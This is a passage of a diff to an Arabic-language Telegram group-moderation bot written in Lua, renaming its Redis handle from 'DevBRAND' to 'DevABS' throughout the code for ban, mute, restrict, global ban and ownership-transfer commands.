+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:KickBan"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الطرد والحظر من قبل المنشئين')
 return false
 end
@@ -5679,7 +5679,7 @@ send(msg.chat_id_,msg.id_,"⌁︙لا استطيع حظر مشرفين المج�
 return false  
 end
 ChatKick(msg.chat_id_, user)
-DevBRAND:sadd(BRAND..'BRAND:Ban:'..msg.chat_id_, user)
+DevABS:sadd(BRAND..'BRAND:Ban:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم حظره من المجموعه")  
 end,nil) 
 end
@@ -5688,7 +5688,7 @@ end
 --         UnBan          --
 if text ==('الغاء الحظر') or text ==('الغاء حظر') and ChCheck(msg) then
 function UnBanReply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_, result.sender_user_id_)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء حظره من المجموعه")  
 end 
@@ -5699,7 +5699,7 @@ if text and (text:match('^الغاء الحظر @(.*)') or text:match('^الغا
 local username = text:match('^الغاء الحظر @(.*)') or text:match('^الغاء حظر @(.*)')
 function UnBanUser(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_, result.id_)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء حظره من المجموعه")  
 else 
@@ -5709,7 +5709,7 @@ resolve_username(username,UnBanUser)
 end
 if text and (text:match('^الغاء الحظر (%d+)') or text:match('^الغاء حظر (%d+)')) and ChCheck(msg) then
 local user = text:match('الغاء الحظر (%d+)') or text:match('الغاء حظر (%d+)')
-DevBRAND:srem(BRAND..'BRAND:Ban:'..msg.chat_id_, user)
+DevABS:srem(BRAND..'BRAND:Ban:'..msg.chat_id_, user)
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = user, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
 ReplyStatus(msg,user,"Reply","⌁︙تم الغاء حظره من المجموعه")  
 end 
@@ -5719,17 +5719,17 @@ end
 if Admin(msg) then
 if text ==('كتم') and ChCheck(msg) then
 function MuteReply(extra, result, success)
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
 if RankChecking(result.sender_user_id_, result.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
-if DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, result.sender_user_id_) then
+if DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
 else
-DevBRAND:sadd(BRAND..'BRAND:Muted:'..msg.chat_id_, result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Muted:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم كتمه من المجموعه")  
 end 
 end
@@ -5740,7 +5740,7 @@ end end
 if text and text:match('^كتم @(.*)') and ChCheck(msg) then
 local username = text:match('^كتم @(.*)')
 function MuteUser(extra,result,success)
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
@@ -5748,10 +5748,10 @@ if result.id_ then
 if RankChecking(result.id_, msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
 else
-if DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, result.id_) then
+if DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, result.id_) then
 ReplyStatus(msg,result.id_,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
 else
-DevBRAND:sadd(BRAND..'BRAND:Muted:'..msg.chat_id_, result.id_)
+DevABS:sadd(BRAND..'BRAND:Muted:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم كتمه من المجموعه")  
 end
 end
@@ -5762,17 +5762,17 @@ resolve_username(username,MuteUser)
 end
 if text and text:match('^كتم (%d+)') and ChCheck(msg) then
 local user = text:match('كتم (%d+)')
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
 if RankChecking(user, msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع كتم ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
 else
-if DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, user) then
+if DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, user) then
 ReplyStatus(msg,user,"Reply","⌁︙هو بالفعل مكتوم من المجموعه")  
 else
-DevBRAND:sadd(BRAND..'BRAND:Muted:'..msg.chat_id_, user)
+DevABS:sadd(BRAND..'BRAND:Muted:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم كتمه من المجموعه")  
 end
 end
@@ -5781,10 +5781,10 @@ end
 --         UnMute         --
 if text ==('الغاء الكتم') or text ==('الغاء كتم') and ChCheck(msg) then
 function UnMuteReply(extra, result, success)
-if not DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, result.sender_user_id_) then
+if not DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
 else
-DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
 end
 end 
@@ -5795,10 +5795,10 @@ if text and (text:match('^الغاء الكتم @(.*)') or text:match('^الغا
 local username = text:match('^الغاء الكتم @(.*)') or text:match('^الغاء كتم @(.*)')
 function UnMuteUser(extra,result,success)
 if result.id_ then
-if not DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, result.id_) then
+if not DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, result.id_) then
 ReplyStatus(msg,result.id_,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
 else
-DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
 end
 else 
@@ -5808,10 +5808,10 @@ resolve_username(username,UnMuteUser)
 end
 if text and (text:match('^الغاء الكتم (%d+)') or text:match('^الغاء كتم (%d+)')) and ChCheck(msg) then
 local user = text:match('الغاء الكتم (%d+)') or text:match('الغاء كتم (%d+)')
-if not DevBRAND:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, user) then
+if not DevABS:sismember(BRAND..'BRAND:Muted:'..msg.chat_id_, user) then
 ReplyStatus(msg,user,"Reply","⌁︙هو ليس مكتوم لالغاء كتمه")  
 else
-DevBRAND:srem(BRAND..'BRAND:Muted:'..msg.chat_id_, user)
+DevABS:srem(BRAND..'BRAND:Muted:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم الغاء كتمه من المجموعه")  
 end
 end 
@@ -5821,7 +5821,7 @@ end
 if Admin(msg) then
 if text ==('تقييد') or text ==('تقيد') and ChCheck(msg) then
 function TkeedReply(extra, result, success)
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
@@ -5829,7 +5829,7 @@ if RankChecking(result.sender_user_id_, result.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.sender_user_id_, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده من المجموعه")  
 end
 end 
@@ -5839,7 +5839,7 @@ end end
 if text and (text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')) and ChCheck(msg) then
 local username = text:match('^تقييد @(.*)') or text:match('^تقيد @(.*)')
 function TkeedUser(extra,result,success)
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
@@ -5848,7 +5848,7 @@ if RankChecking(result.id_, msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(result.id_, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.id_)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم تقيده من المجموعه")  
 end
 else 
@@ -5858,7 +5858,7 @@ resolve_username(username,TkeedUser)
 end
 if text and (text:match('^تقييد (%d+)') or text:match('^تقيد (%d+)')) and ChCheck(msg) then
 local user = text:match('تقييد (%d+)') or text:match('تقيد (%d+)')
-if not Constructor(msg) and DevBRAND:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
+if not Constructor(msg) and DevABS:get(BRAND.."BRAND:Lock:MuteTked"..msg.chat_id_) then 
 send(msg.chat_id_, msg.id_,'⌁︙لقد تم تعطيل الكتم والتقيد من قبل المنشئين')
 return false
 end
@@ -5866,7 +5866,7 @@ if RankChecking(user, msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdRank(user, msg.chat_id_), 1, 'md')
 else
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user)
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, user)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم تقيده من المجموعه")  
 end
 end
@@ -5875,7 +5875,7 @@ end
 if text ==('الغاء تقييد') or text ==('الغاء تقيد') and ChCheck(msg) then
 function UnTkeedReply(extra, result, success)
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
 end
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5886,7 +5886,7 @@ local username = text:match('^الغاء تقييد @(.*)') or text:match('^ال
 function UnTkeedUser(extra,result,success)
 if result.id_ then
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.id_)
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5896,7 +5896,7 @@ end
 if text and (text:match('^الغاء تقييد (%d+)') or text:match('^الغاء تقيد (%d+)')) and ChCheck(msg) then
 local user = text:match('الغاء تقييد (%d+)') or text:match('الغاء تقيد (%d+)')
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..user.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
-DevBRAND:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_, user)
+DevABS:srem(BRAND..'BRAND:Tkeed:'..msg.chat_id_, user)
 ReplyStatus(msg,user,"Reply","⌁︙تم الغاء تقيده من المجموعه")  
 end
 end 
@@ -5914,12 +5914,12 @@ if SudoId(result.sender_user_id_) == true then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
+if DevABS:sismember(BRAND..'BRAND:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
 return false 
 end
 ChatKick(result.chat_id_, result.sender_user_id_)
-DevBRAND:sadd(BRAND..'BRAND:BanAll:', result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:BanAll:', result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم حظره عام من المجموعات")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -5936,13 +5936,13 @@ if SudoId(result.id_) == true then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',result.id_) and not Sudo(msg) then
+if DevABS:sismember(BRAND..'BRAND:SecondSudo:',result.id_) and not Sudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
 return false 
 end
 if result.id_ then
 ChatKick(msg.chat_id_, result.id_)
-DevBRAND:sadd(BRAND..'BRAND:BanAll:', result.id_)
+DevABS:sadd(BRAND..'BRAND:BanAll:', result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم حظره عام من المجموعات")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -5959,12 +5959,12 @@ if SudoId(tonumber(user)) == true then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',user) and not Sudo(msg) then
+if DevABS:sismember(BRAND..'BRAND:SecondSudo:',user) and not Sudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع حظر المطور الثانوي*", 1, 'md')
 return false 
 end
 ChatKick(msg.chat_id_, user)
-DevBRAND:sadd(BRAND..'BRAND:BanAll:', user)
+DevABS:sadd(BRAND..'BRAND:BanAll:', user)
 ReplyStatus(msg,user,"Reply","⌁︙تم حظره عام من المجموعات")  
 end
 --     Source BRAND     --
@@ -5979,11 +5979,11 @@ if SudoId(result.sender_user_id_) == true then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
+if DevABS:sismember(BRAND..'BRAND:SecondSudo:',result.sender_user_id_) and not Sudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
 return false 
 end
-DevBRAND:sadd(BRAND..'BRAND:MuteAll:', result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:MuteAll:', result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم كتمه عام من المجموعات")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -6000,12 +6000,12 @@ if SudoId(result.id_) == true then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',result.id_) and not Sudo(msg) then
+if DevABS:sismember(BRAND..'BRAND:SecondSudo:',result.id_) and not Sudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
 return false 
 end
 if result.id_ then
-DevBRAND:sadd(BRAND..'BRAND:MuteAll:', result.id_)
+DevABS:sadd(BRAND..'BRAND:MuteAll:', result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم كتمه عام من المجموعات")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -6022,19 +6022,19 @@ if SudoId(tonumber(user)) == true then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الاساسي*", 1, 'md')
 return false 
 end
-if DevBRAND:sismember(BRAND..'BRAND:SecondSudo:',user) and not Sudo(msg) then
+if DevABS:sismember(BRAND..'BRAND:SecondSudo:',user) and not Sudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙*لاتستطيع كتم المطور الثانوي*", 1, 'md')
 return false 
 end
-DevBRAND:sadd(BRAND..'BRAND:MuteAll:', user)
+DevABS:sadd(BRAND..'BRAND:MuteAll:', user)
 ReplyStatus(msg,user,"Reply","⌁︙تم كتمه عام من المجموعات")  
 end
 --     Source BRAND     --
 --         UnAll          --
 if text ==('الغاء عام') or text ==('الغاء العام') then
 function UnAllReply(extra, result, success)
-DevBRAND:srem(BRAND..'BRAND:BanAll:', result.sender_user_id_)
-DevBRAND:srem(BRAND..'BRAND:MuteAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:BanAll:', result.sender_user_id_)
+DevABS:srem(BRAND..'BRAND:MuteAll:', result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
 end 
 if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
@@ -6044,8 +6044,8 @@ if text and (text:match('^الغاء عام @(.*)') or text:match('^الغاء �
 local username = text:match('^الغاء عام @(.*)') or text:match('^الغاء العام @(.*)')
 function UnAllUser(extra,result,success)
 if result.id_ then
-DevBRAND:srem(BRAND..'BRAND:BanAll:', result.id_)
-DevBRAND:srem(BRAND..'BRAND:MuteAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:BanAll:', result.id_)
+DevABS:srem(BRAND..'BRAND:MuteAll:', result.id_)
 ReplyStatus(msg,result.id_,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
 else 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙*المعرف غير صحيح*', 1, 'md')
@@ -6054,8 +6054,8 @@ resolve_username(username,UnAllUser)
 end
 if text and (text:match('^الغاء عام (%d+)') or text:match('^الغاء العام (%d+)')) then
 local user = text:match('الغاء عام (%d+)') or text:match('الغاء العام (%d+)')
-DevBRAND:srem(BRAND..'BRAND:BanAll:', user)
-DevBRAND:srem(BRAND..'BRAND:MuteAll:', user)
+DevABS:srem(BRAND..'BRAND:BanAll:', user)
+DevABS:srem(BRAND..'BRAND:MuteAll:', user)
 ReplyStatus(msg,user,"Reply","⌁︙تم الغاء (الحظر • الكتم) عام من المجموعات")  
 end
 end
@@ -6063,19 +6063,19 @@ end
 --     Source BRAND     --
 if (text == "تغير المطور الاساسي" or text == "نقل ملكيه البوت" or text == "تغيير المطور الاساسي" or text == "↫ تغير المطور الاساسي ⌁") and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
 send(msg.chat_id_, msg.id_,'⌁︙يجب التاكد ان المطور الجديد ارسل start لخاص البوت بعد ذلك يمكنك ارسال ايدي المطور')
-DevBRAND:setex(BRAND.."BRAND:EditDev"..msg.sender_user_id_,300,true)
+DevABS:setex(BRAND.."BRAND:EditDev"..msg.sender_user_id_,300,true)
 end
-if DevBRAND:get(BRAND.."BRAND:EditDev"..msg.sender_user_id_) then
+if DevABS:get(BRAND.."BRAND:EditDev"..msg.sender_user_id_) then
 if text and text:match("^الغاء$") then 
 send(msg.chat_id_, msg.id_,'⌁︙تم الغاء امر تغير المطور الاساسي')
-DevBRAND:del(BRAND.."BRAND:EditDev"..msg.sender_user_id_)
+DevABS:del(BRAND.."BRAND:EditDev"..msg.sender_user_id_)
 return false
 end
 if text and text:match("^(%d+)$") then 
 tdcli_function ({ID = "GetUser",user_id_ = text},function(arg,dp) 
 if dp.first_name_ ~= false then
-DevBRAND:del(BRAND.."BRAND:EditDev"..msg.sender_user_id_)
-DevBRAND:set(BRAND.."BRAND:NewDev"..msg.sender_user_id_,dp.id_)
+DevABS:del(BRAND.."BRAND:EditDev"..msg.sender_user_id_)
+DevABS:set(BRAND.."BRAND:NewDev"..msg.sender_user_id_,dp.id_)
 if dp.username_ ~= false then DevUser = '\n⌁︙المعرف ↫ [@'..dp.username_..']' else DevUser = '' end
 local Text = '⌁︙الايدي ↫ '..dp.id_..DevUser..'\n⌁︙الاسم ↫ ['..dp.first_name_..'](tg://user?id='..dp.id_..')\n⌁︙تم حفظ المعلومات بنجاح\n⌁︙استخدم الازرار للتاكيد ↫ ⤈'
 keyboard = {} 
@@ -6084,7 +6084,7 @@ Msg_id = msg.id_/2097152/0.5
 return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 else
 send(msg.chat_id_, msg.id_,"⌁︙المعلومات خاطئه قم بالتاكد واعد المحاوله")
-DevBRAND:del(BRAND.."BRAND:EditDev"..msg.sender_user_id_)
+DevABS:del(BRAND.."BRAND:EditDev"..msg.sender_user_id_)
 end
 end,nil)
 return false
@@ -6092,24 +6092,24 @@ end
 end
 --     Source BRAND     --
 if msg.reply_to_message_id_ ~= 0 then
-if text and text:match("^رفع مطي$") and not DevBRAND:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
+if text and text:match("^رفع مطي$") and not DevABS:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
 function donky_by_reply(extra, result, success)
-if DevBRAND:sismember(BRAND..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
+if DevABS:sismember(BRAND..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو مطي شرفع منه بعد😹💔") 
 else
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم رفعه في قائمة المطايه") 
-DevBRAND:sadd(BRAND..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
+DevABS:sadd(BRAND..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
 end end
 --     Source BRAND     --
 if msg.reply_to_message_id_ ~= 0  then
-if text and text:match("^تنزيل مطي$") and not DevBRAND:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
+if text and text:match("^تنزيل مطي$") and not DevABS:get(BRAND..'BRAND:Lock:Stupid'..msg.chat_id_) and ChCheck(msg) then
 function donky_by_reply(extra, result, success)
-if not DevBRAND:sismember(BRAND..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
+if not DevABS:sismember(BRAND..'User:Donky:'..msg.chat_id_, result.sender_user_id_) then
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙هو ليس مطي ليتم تنزيله") 
 else
-DevBRAND:srem(BRAND..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
+DevABS:srem(BRAND..'User:Donky:'..msg.chat_id_, result.sender_user_id_)
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تنزيله من قائمة المطايه") 
 end end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,donky_by_reply)
@@ -6126,7 +6126,7 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdR
 else 
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." د") 
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 end end 
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
@@ -6141,7 +6141,7 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdR
 else 
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." س") 
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 end end
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
@@ -6156,7 +6156,7 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا تستطيع تقيد ↫ '..IdR
 else 
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+num1))
 ReplyStatus(msg,result.sender_user_id_,"Reply","⌁︙تم تقيده لمدة ↫ "..mutept.." ي") 
-DevBRAND:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
+DevABS:sadd(BRAND..'BRAND:Tkeed:'..msg.chat_id_, result.sender_user_id_)
 end end
 if tonumber(msg.reply_to_message_id_) == 0 then else
 tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, mut_time,nil) end 
@@ -6166,8 +6166,8 @@ end
 if text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then  
 if Constructor(msg) then
 TXT = text:match("^اضف رسائل (%d+)$")
-DevBRAND:set('BRANDTTEAM:'..BRAND..'id:user'..msg.chat_id_,TXT)  
-DevBRAND:setex('BRANDTTEAM:'..BRAND.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
+DevABS:set('BRANDTTEAM:'..BRAND..'id:user'..msg.chat_id_,TXT)  
+DevABS:setex('BRANDTTEAM:'..BRAND.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
